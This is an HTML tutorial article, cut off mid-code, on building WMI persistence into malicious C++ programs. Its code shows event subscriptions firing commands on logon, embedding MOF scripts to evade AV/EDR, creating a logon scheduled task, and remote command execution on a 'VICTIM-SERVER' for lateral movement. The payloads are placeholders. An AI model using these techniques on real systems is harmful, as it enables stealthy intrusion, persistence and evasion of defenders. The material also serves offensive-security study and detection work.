<!DOCTYPE html>
<html>
    <head prefix="og: https://ogp.me/ns#">
        <meta charset="utf-8">
        <title>WMI Based Persistence Mechanisms for Malicious C++ Applications</title>
        <link rel="stylesheet" href="../../../../css/bootstrap.min.css">
        <link rel="stylesheet" href="../../../../css/styles.css">        

        <link rel="stylesheet" href="../../../../js/highlight/styles/github-dark.min.css">
        <script src="../../../../js/highlight/highlight.min.js"></script>
        <script src="../../../../js/highlight/languages/cpp.min.js"></script>
        <script src="../../../../js/highlight/languages/sql.min.js"></script>
        <script src="../../../../js/highlight/languages/python.min.js"></script>
        <script src="../../../../js/bootstrap.min.js"></script>

    </head>
    <body class="article-page">
        <script>hljs.highlightAll();</script>
        <div class="container-fluid p-5 bg-black text-white text-center">
            <h1 class="article-title">WMI Based Persistence Mechanisms for Malicious C++ Applications</h1>
        </div>
        <div class="container-fluid bg-dark">

        <div class="container-fluid article-body bg-dark text-white">
            <section id="toc">
                <h2>Table of Contents</h2>
                <ol>
                    <li><a href="#introduction">Introduction</a></li>
                    <li><a href="#wmicpp">WMI Via C++</a></li>
                    <li><a href="#mofs">Persistence via MOFs</a></li>
                    <li><a href="#mofcpp">MOF Compilation using IMOFCompile</a></li>
                    <li><a href="#event">Persistence via Event Subscription</a></li>
                    <li><a href="#fncall">WMI Function Calls: schtasks.exe</a></li>
                    <li><a href="#rce">Remote WMI Function Calls</a></li>
                    <li><a href="#job">Win32_ScheduledJob</a></li>
                    <li><a href="#evasion">Evasion: Why WMI Interfaces are Awesome</a></li>
                    <li><a href="#misc">Other Useful WMI Objects</a></li>
                    <li><a href="#closing-thoughts">Closing Thoughts</a></li>
                </ol>
                <p>All demo applications for this article can be found <a href="https://github.com/raging-loon/wmi-examples">here</a>.</p>
            </section>
            <section id="introduction">
                <h2>Introduction</h2>
                <p>Windows Management Infrastructure (WMI) is a powerful monitoring and management tool. It can be used both locally and remotely to view and modify information and even executing commands.</p>
                <p>WMI consists of four main components: Managed Applications, WMI Infrastructure, Providers, and Managed Objects.</p>
                <h3>Managed Applications</h3>
                <p>These are Windows applications (e.g. .NET apps, VBS/PowerShell scripts) that interface with WMI and access information about managed objects.</p>
                <h3>WMI Infrastructure</h3>
                <p>According to <i>Windows Internals: Part 2 7<sup>th</sup> Ed.</i>, WMI Infrastructure is "the glue that binds management applications and providers." This is primarily achieved via the Common Information Model (CIM). WMI Infrastructure also implements a repository called the CIMOM Object Repository found at <code>%SystemRoot%\System32\Wbem\Repository</code>. Here is what you should find there:</p>
                <ul>
                    <li><code>Index.btr</code> - A B-Tree index file</li>
                    <li><code>MappingX.map</code> - Transaction Control Files</li>
                    <li><code>Objects.data</code> - The actual repository</li>
                </ul>
                <h3>Providers</h3>
                <p>CIM can be used to represent pretty much anything from physical hardware to Windows services to thirdparty application interfaces. To create a provider you can use the Managed Object Format (MOF) Language. An example of a provider is the Win32 Provider which provides objects such as <code>Win32_DiskDrive</code>. You can find a list of WMI providers provider by Microsoft <a href="https://learn.microsoft.com/en-ca/windows/win32/wmisdk/wmi-providers?redirectedfrom=MSDN">here</a>.</p>
                <h3>Managed Objects</h3>
                <p>These are objects stored in the WMI repository. They are similar to objects in the traditional OOP sense, including inheritance and composition. This allows objects to be combined in a way, e.g. <code>Win32_LogonSession</code> inherits many properties from <code>Win32_Session</code>.</p>
                <h3>WMI Namespaces</h3>
                <p>WMI is organized into many namespaces, the topmost being <code>ROOT</code>.The primary ones are</p>
                <ul>
                    <li><code>ROOT\CIMv2</code></li>
                    <li><code>ROOT\Default</code></li>
                    <li><code>ROOT\Subscription</code></li>
                    <li><code>ROOT\Security</code></li>
                    <li><code>ROOT\WMI</code></li>
                </ul>
                <p><code>ROOT\CIMv2</code> is where you will query information about the operating system such as processes. <code>ROOT\Subscription</code> is where WMI event subscriptions will be placed. This is where you would want to start looking if you suspect WMI is being used for persistence.</p>
            </section>
            <section id="wmicpp">
                <h2>WMI via C++</h2>
                <p>This section will cover the basics of connecting to a WMI namespace and submitting/parsing a query. You can find the complete example <a href="https://github.com/raging-loon/wmi-examples/blob/main/WMIPlayground/main.cpp">here</a>.</p>
                <h3>Helpers</h3>
                <p>WMI via C++ is a colossal task. It involves a lot of set up and error checking before you can send a query. To assist with error checking, I will implement a small wrapper class called <code>InterfacePtr</code>. This is a templated class that wraps around WBEM interfaces such as <code>IWbemLocator</code> or <code>IWbemServices</code>. This class will automatically release resources for us, alleviating us of the pain of doing it manually. You might ask: "Why not just use <code>ComPtr</code> from the WRL library?" This was tried, it seems to exclusively work with "pure" COM and DirectX objects. It would happily hold the objects and provide access to them, but it did not destroy them. <code>InterfacePtr</code> is modelled after <code>ComPtr</code>.</p>
                <pre><code class="language-cpp">
// almost certainly overkill, but I've been wanting to experiment
// with C++ Concepts for a while now
template &lt;class T>
concept interface_has_release = requires(T t) 
{
    { t.Release() } -> std::same_as&lt;ULONG>;
};

template &lt;class T> requires interface_has_release&lt;T>
class InterfacePtr 
{
public:
    InterfacePtr() : m_ptr{nullptr} {}
	InterfacePtr(T* other) : m_ptr(other) {}
	
	~InterfacePtr() {
		if(m_ptr) {
			m_ptr->Release();
			m_ptr = nullptr;
		}
    }

    T* Get() { return m_ptr; }
	T** GetAddressOf() { return &m_ptr; }
	
	T* operator->() { return m_ptr; }
	T& operator*() { assert(m_ptr); return *m_ptr; }
private:
    T* m_ptr;
};
                </code></pre>
                <p>Next I will define a simple macro for error checking: </p>
                <pre><code class="language-cpp">
#define CHECK(hr, message) \
{ \
	if(FAILED(hr)) { \
		cout <&lt;message <&lt;": 0x" <&lt;hex <&lt;x <&lt;endl; \
		CoUninitialize(); \
		return hr; \
	} \
}
                </code></pre>
                <p>You can find the <code>InterfacePtr</code> template <a href="https://github.com/raging-loon/wmi-examples/blob/main/common/InterfacePtr.h">here</a> and the check macro <a href="https://github.com/raging-loon/wmi-examples/blob/main/common/Check.h">here</a>.</p>
                <p>Now that that is out of the way, we can begin.</p>
                <h3>COM Initialization</h3>
                <p>Before beginning work with WMI, you must initialize COM and security for it. This is done via <code>CoInitializeEx</code> and <code>CoInitializeSecurity</code>.</p>
                <pre><code class="language-cpp">
HRESULT hr = CoInitializeEx(0, COINIT_MULTITHREADED);
if(FAILED(hr)) {
	cout <&lt;"Failed to initialize COM: 0x" <&lt;hex <&lt;hr <&lt;endl;
	return hr;
}

hr = CoInitializeSecurity(NULL,                 // Security descriptor
	-1,					// COM negotiates with auth svc
	NULL,					// Authentication Services
	NULL,					// Res
	RPC_C_AUTHN_LEVEL_DEFAULT,              // Default auth. lvl for proxies
	RPC_C_IMP_LEVEL_IMPERSONATE.            // Default impersonate lvl for proxies
	NULL,					// Auth info
	EOAC_NONE,				// Additional Capabilities
	NULL,					// Res.
);
CHECK(hr, "Failed to initialize COM security");

                </code></pre>
                <p>The authentication level describes how we will authenticate with the COM server. Using the default (<code>RPC_C_AUTHN_LEVEL_DEFAULT</code>) is fairly common. You might also see <code>RPC_C_AUTHN_LEVEL_CALL</code> which will authenticate at the start of every RPC call. <code>RPC_C_AUTHN_LEVEL_PKT*</code> will authenticate each piece of data and possibly perform integrity checks/encryption.</p>
                <p>The impersonation level describes "the amount of authority given to the server when it is impersonating the client." <code>RPC_C_IMP_LEVEL_IMPERSONATE</code> tells the server to essentially 'pretend' to be the client when accessing resources.</p>
                <h3>Locating and Connecting to a WMI Namespace</h3>
                <p>Now we can see <code>InterfacePtr</code> in action. To connect to a namespace, you must first locate it. This is fairly straightforward when connecting to the local system. It can be a bit more complicated when connecting to a remote system. This requires more authentication information such as an authentication protocol (e.g. NTLM).</p>
                <p>To create the locator (<code>IWbemLocator</code>), you will need to call <code>CoCreateInstance</code> and provide it with class identification information. Internally, this will check the internal class database and cache for a concrete class, such as <code>CWbemLocator</code>. Afterwards, you can connect to the namespace using <code>IWbemLocator::ConnectServer</code> with proper authentication information if necessary.</p>
                <p>After connecting to the server, if all is well, you will have an instance of <code>IWbemServices</code>. That is your entry point into WMI. Almost all work will be done through that interface.</p>
                <pre><code class="language-cpp">
InterfacePtr&lt;IWbemLocator> locator = nullptr;
InterfacePtr&lt;IWbemServices> services = nullptr;

hr = CoCreateInstance(
	CLSID_WbemLocator,			// Class ID
	0,					 
	CLSCTX_INPROC_SERVER,
	// VVV see note
	IID_IWbemLocator, (LPVOID*)(locator.GetAddressOf()))
);

CHECK(hr, "Failed to create locator");

services = locator->ConnectServer(
	_bstr_t(L"ROOT\\DEFAULT"),	// namespace
	NULL,				// user name
	NULL,				// password
	0,				// locale
	NULL,				// security flags
	0,				// authority
	0,				// context object
	services.GetAddressOf()	// proxy
);
CHECK(hr, "Failed to connect to namespace");
                </code></pre>

            <p>Note that the last to parameters of <code>CoCreateInstance</code> can be replaced with the <code>IID_PPV_ARGS</code> macro provided byy the COM API: <code class="language-cpp">IID_PPV_ARGS(locator.GetAddressOf())</code>. If you work with DirectX, you've likely seen that macro a lot.</p>
            <p>Now that we are connected, we can perform actual WMI work such as queries and event subscription.</p>
            <h3>WQL and Creating Queries</h3>
            <p>WQL is a subset of the official SQL standard, created for querying managed objects. Here is an example which will retrieve the most recently created process object:</p>
            <pre><code class="language-sql">
SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA "Win32_Process";
            </code></pre>
            <p>Items beginning with '__' are typically related to events such as <code>__EventFilter</code> or <code>__InstanceDeletionEvent</code>.</p>
            <p>To perform a query, you can use the <code>IWbemServices::ExecQuery</code> function. This will create an <code>IEnumWbemClassObject</code> instance which will enumerate CIM objects. This example will retrieve information about the operating system via the <code>Win32_OperatingSystem</code> managed object:</p>
            <pre><code class="language-cpp">
InterfacePtr&lt;IEnumWbemClassObject> enumObj = nullptr;
hr = services->ExecQuery(
	_bstr_t(L"WQL"),
	_bstr_t(L"SELECT * FROM 'Win32_OperatingSystem'"),
	WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
	NULL,
	enumObj.GetAddressOf()
);

CHECK(hr, "Failed to perform query");
            </code></pre>
            <h3>Working with the Class Enumerator Object</h3>
            <p>Once you have an instance of the enumerator, you can use it to retrieve individual objects in the form of <code>IWbemClassObject</code>s. You will need to use the <code>VARIANT</code> structure provided by WIN API to extract information from it.</p>
            <pre><code class="language-cpp">
InterfacePtr&lt;IWbemClassObject> classObj = nullptr;
ULONG ret = 0;

while(enumObj.Get()) {
	enumObj->Next(WBEM_INFINITE, 1, classObj.GetAddressOf(), &ret);
	if(ret == 0)
		break;

	VARIANT vtProp;
	VariantInit(&vtProp);
	classObj->Get(L"Name", 0, &vtProp, 0 ,0);
	
	std::wcout <&lt;"OS NAME: " <&lt;vtProp.bstrVal <&lt;endl;

	VariantClear(&vtProp);
}
            </code></pre>
            <p>If you are unfamiliar with variants, they are structures whose type can vary. In this example it is a <code>BSTR</code>, which is a type-alias for <code>OLECHAR</code> which is a type-alias for <code>WCHAR</code> which is a…I’ll stop here. Why oh why WINAPI. Variants are typically implemented with unions.</p>
            <p>Other than clean up code (now just uninitializing COM), that is everything you need to make a WMI query and parse it using C++.</p>
            </section>
            <section id="mofs">
                <h2>Persistence via Managed Object Format Language</h2>
                <p>There are many many ways to create managed objects. You can use VBS, PowerShell, C++, C#, or any .NET compatible language. I will be using the MOF language because it is common in system administration and it pretty clearly translates to what needs to be done in C++. I like to use MOF scripts as templates for what I write in C++.</p>
                <p>The MOF script I will create will subscribe to the <code>Win32_LogonSession</code> event, then run a command to create a file. <code>Win32_LogonSession</code> is triggered whenever a user logs in, both locally and remotely.</p>
                <p>This MOF script has three parts: an Event Filter, an Event Consumer, and a Binding which binds the former two.</p>
                <p>The Event Filter determines under which conditions WMI will trigger the event. The Event Consumer defines what action to take upon receipt of an event. Finally, the binding registers both with WMI.</p>
                <p>Here is the script: </p>
                <pre><code class="language-cpp">
#PRAGMA NAMESPACE ("\\\\.\\ROOT\\SUBSCRIPTION")

instance of __EventFilter as $Filter {
    Name = "GoodWare";
    EventNamespace = "ROOT\\CIMV2";
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 1 "
            "WHERE TargetInstance ISA 'Win32_LogonSession'";
    QueryLanguage = "WQL"; 
};

instance of CommandLineEventConsumer as $Consumer {
    Name = "Good Ware Consumer";
    RunInteractively = false;
    CommandLineTemplate = "cmd.exe /c echo \"hello\"> C:\\hello.txt";
};

instance of __FilterToConsumerBinding {
    Filter = $Filter;
    Consumer = $Consumer;
};
                </code></pre>
                <p>You can then use <code>mofcomp.exe</code> (as Administrator) to create the subscription.</p>
                <p>The great thing about MOF scripts is that they translate almost 1 to 1 into C++. The C++ code for making an even subscription will create an event consumer and set its values and so on. So, you could use MOF scripts to test out exactly what you want to do, then translate that into C++ code.</p>
                <p>Some notes:</p>
                <ul>
                    <li>When you have multi-line queries, be mindful of spaces at the end or beginning of each string. Otherwise, you could get a   query like "<code>...WITHIN 1WHERE Target...</code>".  Check the Application Event Log if you suspect this is that case, it will tell you the exact query. 
                    </li>
                    <li>Be mindful of the namespace which you are querying. If you did not define <code>EventNamespace</code> in the                <code>EventFilter</code>, it would have defaulted to the <code>ROOT\Subscribe</code> namespace, as per the pragma directive.
                    </li>
                    <li>You can use <code>mofcomp.exe -check <.mof file></code> to verify your MOF's syntax.</li>
                    <li>Finally, make sure you are using proper escape characters; <code>mofcomp.exe</code> will otherwise present you with an <i>extremely</i> unhelpful error message.</li>
                </ul>
            </section>
            <section id="mofcpp">
                <h2>MOF Compilation using IMofCompiler</h2>
                <p>A lot (most?) AV/EDR solutions will watch for the execution of <code>mofcomp.exe</code>, thus blocking your persistence attempts. Furthermore, <code>mofcomp.exe</code> only works with files, so using it would be writing a file to the disk and therefore creating an artefact for analysts to look at.</p>
                <p>Fortunately, there exists an interface for MOF compilation. You could easily embed (and perhaps encrypt) a MOF script within your executable, then use the <code>IMofCompiler</code> interface to compile it. To do this, you only need to have COM and COM Security initialized. No other objects are needed.</p>
                <pre><code class="language-cpp">
// MofScript.h
const std::string MOF_SCRIPT = R"mof(
#PRAGMA NAMESPACE ("\\\\.\\ROOT\\SUBSCRIPTION")
...
...
)mof";

// main.cpp
InterfacePtr&lt;IMofCompiler> mofc = nullptr;

hr = CoCreateInstance(
    CLSID_MofCompiler,
    0,
    CLSCTX_INPROC_SERVER,
    IID_IMofCompiler,
    (LPVOID*)(mofc.GetAddressOf())
);

CHECK(hr, "Failed to create compiler instance.");

mofc->CompileBuffer(
    MOF_SCRIPT.size(),
    MOF_SCRIPT.data(),
    BSTR(L"ROOT\\SUBSCRIPTION"),
    NULL,
    NULL,
    WBEM_FLAG_CHECK_ONLY,
    0,
    0,
    NULL
);
                </code></pre>
                <p>This example will only perform syntax check per the <code>WBEM_FLAG_CHECK_ONLY</code> flag. The MOF Compiler interface can also compile scripts in the form of files using <code>IMofCompiler::CompileFile</code>. Finally, the MOF Compiler Interface can create and compile binary MOF files through <code>IMofCompiler::CompileBMOF</code> and <code>IMofCompiler::CompileBuffer</code> respectively.</p>
                <p><a href="https://github.com/raging-loon/wmi-examples/tree/main/MOFCompilerDemo">Demo Code</a></p>
            </section>
            <section id="event">
                <h2>Persistence via Event Subscription in C++</h2>
                <a href="https://github.com/raging-loon/wmi-examples/tree/main/EventSubscription1">Demo Code for Event Subscription</a>
                <p>Another method is to use the WMI API from C++. It is a bit more work, but can be potentially less detectable. We must do the following:</p>
                <ol>
                    <li>Set up COM and connect to the namespace</li>
                    <li>Create a Filter class and spawn an instance</li>
                    <ol>
                        <li>Populate the filter instance and update WMI</li>
                    </ol>
                    <li>Create a consumer class and spawn an instance</li>
                    <ol>
                        <li>Populate the filter instance and update WMI</li>
                    </ol>
                    <li>Create a binding class and spawn an instance</li>
                    <ol>
                        <li>Populate the binding class and update WMI</li>
                    </ol>
                    <li>Clean up</li>
                </ol>
                <p>Working with WMI can be very tedious and repetitive. I will avoid repeating myself in this section where possible.</p>
                <h3>Creating an instance</h3>
                <p>We will be using <code>IWbemClassObject</code> to represent both the class retrieved from WMI and the instance spawned from it. Here is an example of it being used to create the event filter: </p>
                <pre><code class="language-cpp">
InterfacePtr&lt;IWbemClassObject> filterClass = nullptr;
InterfacePtr&lt;IWbemClassObject> filterInstance = nullptr;

hr = services->GetObject(
    _bstr_t(L"__EventFilter"), 0, NULL, filterClass.GetAddressOf(), NULL
);

CHECK(hr, "Failed to get __EventFilter object");

hr = filterClass->SpawnInstance(0, filterInstance.GetAddressOf());

CHECK(hr, "Failed to create event filter instance");
                </code></pre>
                <p>The same is done for the consumer and binding objects. The Consumer however must be retrieved by type, e.g. <code>CommandLineEventConsumer</code> or <code>NTEventLogEventConsumer</code>. The filter must be retrieved via <code>__FilterToConsumerBinding</code>.</p>
                <h3>Populating The Instance</h3>
                <p>This is done with <code>VARIANT</code>s. This is the tedious part. I will show you how to do it for the Event Consumer, but it is practically identical for the filter and binding.</p>
                <pre><code class="language-cpp">
InterfacePtr &lt;IWbemClassObject> consumerClass = nullptr;
InterfacePtr &lt;IWbemClassObject> consumerInstance = nullptr;

... initialization and error checking ...

BSTR consumerName = _bstr_t(L"GoodWare Consumer");
BSTR consumerTemplateValue = _bstr_t(L"cmd .exe /c echo \"hello\"> C:\\hello.txt");

VARIANT var;
VariantInit(&var);

var.vt = VT_BSTR;
var.bstrVal = consumerName;

hr = consumerInstance->Put(L"Name", 0, &var, 0);

VariantClear(&var);

var.vt = VT_BSTR;
var.bstrVal = consumerTemplateValue;

hr = consumerInstance->Put(L"CommandLineTemplate", 0, &var, 0);

VariantClear(&var);

var.vt = VT_BOOL;
var.boolVal = FALSE;

hr = consumerInstance->Put(L"RunInteractively", 0, &var, 0);
                </code></pre>
                <p>I imagine one could make wrapper around this for any intensive work.</p>
                <h3>Updating WMI</h3>
                <p>This is done via <code>IWbemServices::PutInstance</code> with the <code>WBEM_FLAG_CREATE_OR_UPDATE</code> flag.</p>
                <pre><code class="language-cpp">
hr = services->PutInstance(consumerInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);

CHECK(hr, "Failed to update WMI with consumer instance");
                </code></pre>
                <h3>Binding the Filter and Consumer</h3>
                <p>This follows the same basic steps as above, but there are more specific values that need to be set. It is imperative that you use the same names for your filter and consumer class here.</p>
                <pre><code class="language-cpp">
InterfacePtr&lt;IWbemClassObject> bindingClass = nullptr;
InterfacePtr&lt;IWbemClassObject> bindingInstance = nullptr;

... initialize and error check ...

VARIANT var;
var.vt = VT_BSTR;
var.bstrVal = _bstr_t(
L"\\\\.\\root\\subscription:__EventFilter.Name=\"NAMEOFFILTERHERE\""
); 

hr = bindingInstance->Put(L"Filter", 0, &var, 0);

CHECK(hr, "Failed to bind filter");

VariantClear(&var);
var.vt = VT_BSTR;
var.bstrVal = _bstr_t(
	L"\\\\.\\root\\subscription:CommandLineEventConsumer.Name=\"CONSUMERNAME\""
);

hr = bindingInstance->Put(L"Consumer", 0, &var, 0);

CHECK(hr, "Failed to bind consumer");

hr = services->PutInstance(bindingInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);

CHECK(hr, "Failed to bind");

                </code></pre>
                <p>If everything has succeeded, you will have created an event filter and consumer, binding them, and updated WMI accordingly. Here is a table for each class containing the fields that should be set via variants:</p>
                <h3>__EventFilter</h3>
                <table>
                    <tr>
                        <th>Field Name</th>
                        <th>Type</th>
                        <th>Description</th>
                        <th>Example</th>
                    </tr>
                    <tr>
                        <td>Name</td>
                        <td>BSTR</td>
                        <td>Name of the filter</td>
                        <td>"GoodWare"</td>
                    </tr>
                    <tr>
                        <td>QueryLanguage</td><td>BSTR</td><td>Which language to use</td><td>"WQL"</td>
                    </tr>
                    <tr>
                        <td>Query</td><td>BSTR</td><td>The actual query</td><td>"SELECT * FROM Win32_DiskDrive"</td>
                    </tr>
                    <tr>
                        <td>EventNamespace</td><td>BSTR</td><td>Namespace in which the query should be performed. Default is whatever namespace you are connected to.</td><td>"ROOT\CIMV2"</td>
                    </tr>
                </table>

                <h3>CommandLineEventConsumer</h3>
                <table>
                      <tr>
                        <th>Field Name</th>
                        <th>Type</th>
                        <th>Description</th>
                        <th>Example</th>
                    </tr>
                    <tr>
                        <td>Name</td><td>BSTR</td><td>Name of the Consumer</td><td>"GoodWare Consumer"</td>
                    </tr>
                    <tr>
                        <td>CommandLineTemplate</td><td>BSTR</td><td>What to execute</td><td>"Not_Malware.exe"</td>
                    </tr>
                </table>
                <h3>__FilterToConsumerBinding</h3>
                <table>
                      <tr>
                        <th>Field Name</th>
                        <th>Type</th>
                        <th>Description</th>
                        <th>Example</th>
                    </tr>
                    <tr>
                        <td>Filter</td><td>BSTR</td><td>Name of filter in format [namespace]:[type].Name=[name]</td><td>
                            "ROOT\SUBSCRIPTION:__EventFilter.Name=\"NAME OF FILTER\""
                        </td>
                    </tr>
                      <tr>
                        <td>Consumer</td><td>BSTR</td><td>Name of consumer in format [namespace]:[type].Name=[name]</td><td>
                            "ROOT\SUBSCRIPTION:CommandLineEventConsumer.Name=\"NAME OF CONSUMER\""
                        </td>
                    </tr>
                </table>
            </section>
            <section id="fncall">
                <h2>WMI Function Calls: schtasks.exe</h2>
                <p>Some WMI Objects have methods attached to them. Here, will will use the <code>Create</code> method of <code>Win32_Process</code> to execute <code>schtasks.exe</code>.</p>
                <p>The steps are as follows: </p>
                <ol>
                    <li>Obtain a handle to the target object (<code>Win32_Process</code>)</li>
                    <li>Get a handle to a particular method (<code>Create</code>)</li>
                    <li>Spawn an instance of this method</li>
                    <li>Fill out it's fields, in this case we only need to fill out <code>CommandLine</code></li>
                    <li>Call <code>IWbemServices::ExecMethod</code> with the name of the object, name of the method, and the parameters spawned in step 3.</li>
                </ol>
                <p>After initializing COM and locating/creating an <code>IWbemServices</code> object, you can begin: </p>
                <pre><code class="language-cpp">
InterfacePtr&lt;IWbemClassObject> function = nullptr;
InterfacePtr&lt;IWbemClassObject> method = nullptr;
InterfacePtr&lt;IWbemClassObject> params = nullptr;

hr = services->GetObjectW(
    _bstr_t(L"Win32_Process"),
    0, NULL,
    function.GetAddressOf(),
    NULL
);

CHECK(hr, "Failed to get Win32_Process");

hr = function->GetMethod(
    L"Create", 0, method.GetAddressOf(), NULL
);

CHECK(hr, "Failed to get Create method");

hr = method->SpawnInstance(0, &amp;params);

CHECK(hr, "Failed to spawn instance");

VARIANT var;
VariantInit(&var);

var.vt = VT_BSTR;
var.bstrVal = _bstr_t(L"schtasks /create /tn \"notepad\" /tr \"C:\\Windows\\notepad.exe\" /sc onlogon /ru \"User\"");

params->Put(L"CommandLine", 0, &var, 0);

InterfacePtr&lt;IWbemClassObject> retObj = nullptr;

hr = services->ExecMethod(
    _bstr_t(L"Win32_Process"),
    _bstr_t(L"Create"),
    0, NULL,
    params.Get(),
    retObj.GetAddressOf(),
    NULL
);

                </code></pre>
                <p>It is a tedious but fairly simple process.</p>
            </section>
            <section id="rce">
                <h2>Remote WMI Function Calls</h2>
                <p>It is unlikely that you will come across the conditions for this. If you do, there are probably better attack vectors than WMI. You will need to have the credentials for a user that is both authorized to connect to the target namespace as well as permission to execute. As an administrator or engineer, you can check this via Component Services -> Computers -> [Target] -> Properties -> COM Security.</p>
                <p>The example Microsoft presented for Remote WMI connections uses the CredUI library. I am not going to use that because this is a less than 'legitimate' application (and I don't feel like retyping credentials for this demo). The steps for remotely executing commands are: </p>
                <ol>
                    <li>Initialize COM and COM Security</li>
                    <li>Create a locator and connect to the remote system with the proper namespace using the correct credentials</li>
                    <li>Fill out a <code>COAUTHIDENTITY</code> structure</li>
                    <li>Create a proxy blanket</li>
                    <li>Get a handle to the <code>Win32_Process</code> object</li>
                    <li>Get a handle to the <code>Create</code> method of that object</li>
                    <li>Set it's input parameters</li>
                    <li>Call <code>IWbemServices::ExecMethod</code> and check its return parameters if needed</li>
                </ol>
                <p>We will skip step 1.</p>
                <h3>2. Connecting to the Remote Systems Namespace</h3>
                <p>One major difference between connecting to a local namespace and a remote one is the UNC path. Local connections begin with <code>\\.\ROOT</code> while remote connections begin with <code>\\COMPUTERNAME\ROOT</code>. The call to <code>IWbemLocator::ConnectServer</code> looks almost the exact same. I am storing passwords in clear text because this is just an example, however, you will want to look at the CredUI library for more legitimate applications.</p>
                <pre><code class="language-cpp">
std::wstring computerName = L"\\\\VICTIM-SERVER";
std::wstring _namespace = L"ROOT\\CIMV2";

std::wstring networkResourcePath = computerName + L"\\" + _namespace;

hr = locator->ConnectServer(
    networkResourcePath.data(),
    username.data(),
    password.data(),
    NULL, NULL, NULL, NULL,
    services.GetAddressOf()
);
                </code></pre>
                <h3>The COAUTHIDENTITY Structure</h3>
                <p>This contains the username, password, domain, and lengths for each These lengths need to be the size of each field <u>without</u> the NULL byte. The call to <code>CoSetProxyBlanket</code> will fail otherwise. This structure contains a single flag indicating whether the credentials are stored as ANSI or UNICODE strings.</p>
                <h3>Creating a Proxy Blanket</h3>
                <p>A proxy blanket is used to control various security setting when communicating with COM objects. These include levels of authentication, authorization, impersonation, and an authentication service. It is sort of like setting up COM security, but for a connection rather than globally. Here is the function prototype:</p>
                <pre><code class="language-cpp">
_Check_return_
WINOLEAPI
CoSetProxyBlanket(
    _In_ IUnknown* pProxy,
    _In_ DWORD dwAuthnSvc,
    _In_ DWORD dwAuthzSvc,
    _In_opt_ OLECHAR* pServerPrincName,
    _In_ DWORD dwAuthnLevel,
    _In_ DWORD dwImpLevel,
    _In_opt_ RPC_AUTH_IDENTITY_HANDLE pAuthInfo,
    _In_ DWORD dwCapabilities
    );
                </code></pre>
                <h4>Authentication Service</h4>
                <p>This will typically be <code>RPC_C_AUTHN_WINNT</code> for remote connections. This will ensure it uses the NTLMSSP protocol.</p>
                <h4>Authorization Service</h4>
                <p>This must be set to <code>RPC_C_AUTHZ_NONE</code> if you are using NTLMSSP or Kerberos for authentication, as is likely for remote connections.</p>
                <h4>Service Principal Name</h4>
                <p>This is a unique identifier given to instances of a service. Kerberos uses this to associate services to sign-ins. This must <b>not</b> be NULL if you are using Kerberos. For our purposes, we can use <code>COLE_DEFAULT_PRINCIPAL</code> to let DCOM decide a name for us. This is not a NULL value.</p>
                <h4>Authentication Level</h4>
                <p>This was described previously, but a review could be beneficial. authentication levels are set with the <code>RPC_C_AUTHN_LEVEL_*</code> flags. <code>DEFAULT</code> lets DCOM determine the level for us. <code>CALL</code> will authenticate each RPC call. <code>PKT</code> will authenticate all data received. <code>PKT_PRIVACY</code> and <code>PKT_INTEGRITY</code> will encrypt and verify data respectively. We will use <code>RPC_C_AUTHN_LEVEL_PKT_PRIVACY.</code></p>
                <br>
                <p>It is important that you always set up a proxy blanket for remote connection as it can prevent privilege issues as well as hide the data you are sending.</p>
                <p>Here is the call used in the demo code: </p>
                <pre><code class="language-cpp">
hr = CoSetProxyBlanket(
	services.Get(),
	RPC_C_AUTHN_WINNT,
	RPC_C_AUTHZ_NONE,
	COLE_DEFAULT_PRINCIPAL,
	RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
	RPC_C_IMP_LEVEL_IMPERSONATE,
	&userAcctInfo,
	EOAC_NONE
);

CHECK(hr, "Failed to set Proxy Blanket");
                </code></pre>
                <h3>Steps 5 - 8: Making the Call</h3>
                <p>First we must instruct the WBEM Service object to get the <code>Win32_Process</code> object. Then we extract the <code>Create</code> method from it and its parameters. Once set, we can instruct the WBEM Service to execute it remotely.</p>
                <pre><code class="language-cpp">
InterfacePtr&lt;IWbemClassObject> processObject = nullptr;
InterfacePtr&lt;IWbemClassObject> methodObject = nullptr;
InterfacePtr&lt;IWbemClassObject> paramsObject = nullptr;

hr = services->GetObjectW(
    _bstr_t(L"Win32_Process"), 	// object path
    0, 					// flags
    NULL,					// optional context
    processObject.GetAddressOf(), 	// out object
    NULL			 		// optional call result
);

CHECK(hr, "Failed to get the process object");

hr  = processObject->GetMethod(
    L"Create", 				// Name
    0,					// Flags
    methodObject.GetAddressOf(),	// input signature, input params
    NULL					// output signature, output params
);

CHECK(hr, "Failed to get Create method");

hr = methodObject->SpawnInstance(0, paramsObject.GetAddressOf());

CHECK(hr, "Failed to spawn params instance");



VARIANT var;
VariantInit(&var);

var.vt = VT_BSTR;
var.bstrVal = command.data();
paramsObject->Put(L"CommandLine", 0, &var, 0);

InterfacePtr&lt;IWbemClassObject> results = nullptr;

hr = services->ExecMethod(
    _bstr_t(L"Win32_Process"),	// Object Path
    _bstr_t(L"Create"),		// Method Name
    0,				// Flags
    NULL,				// [opt] Context
    paramsObject.Get(),		// Input Params
    results.GetAddressOf(),	// Output Params
    NULL				// Call result
);

CHECK(hr, "Failed to execute command");

wcout <&lt;L"Sent command \"" <&lt;command <&lt;L"\" successfully" <&lt;endl;

                </code></pre>
                <p>Again, while this requires some special conditions, it could be a potential attack vector, perhaps allowing for lateral movement. An example of where you might find this is in monitoring. Monitoring systems like NimSoft might need a service account for interacting with WMI. Perhaps this has been misconfigured, allowing you to do your dirty deeds.</p>
                <p><a href="https://github.com/raging-loon/wmi-examples/tree/main/BasicRemoteWMI">Demo for Retrieving Information from a Remote System</a></p>
                <p><a href="https://github.com/raging-loon/wmi-examples/tree/main/RemoteWMICodeExec">RCE Demo</a></p>
            </section>
            <section id="job">
                <h2>Win32_ScheduledJob</h2>
                <p>The final method of persistence we will discuss involves a built-in class called <code>Win32_ScheduledJob</code>. From the <a href="https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/win32-scheduledjob">Windows Documentation for this class</a>, we can see that it contains a <code>Create</code> and <code>Delete</code> method.</p>
                <p>Thus, creating and interfacing with a new instance will be a matter of obtaining the required objects, filling out the required fields, and calling the method.</p>
                <pre><code class="language-cpp">
InterfacePtr&lt;IWbemClassObject> function = nullptr;
InterfacePtr&lt;IWbemClassObject> method = nullptr;
InterfacePtr&lt;IWbemClassObject> params = nullptr;

